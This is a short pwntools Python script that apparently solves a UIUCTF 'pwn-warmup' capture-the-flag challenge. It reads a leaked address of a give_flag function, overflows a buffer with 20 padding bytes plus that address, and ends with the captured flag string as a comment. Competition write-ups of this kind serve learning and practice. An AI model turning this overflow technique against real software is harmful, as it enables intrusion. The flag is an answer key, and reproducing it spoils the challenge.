from pwn import *
import time
binf = ELF("bin")
libc = binf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)
        # return remote("pwn-warmup.chal.uiuc.tf",1337)

context.log_level = "DEBUG"
context.aslr = False

print(binf.plt)

shell=""
shell=b"flag.txt"

# i=1
# while(True):
p=start()

#obtener leak
print(p.recvuntil(b'&give_flag = '))
leak=int(p.recv(),16)
print('leak =>',hex(leak))

p.sendline(b'A'*20+p32(leak))

p.interactive()

# uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}
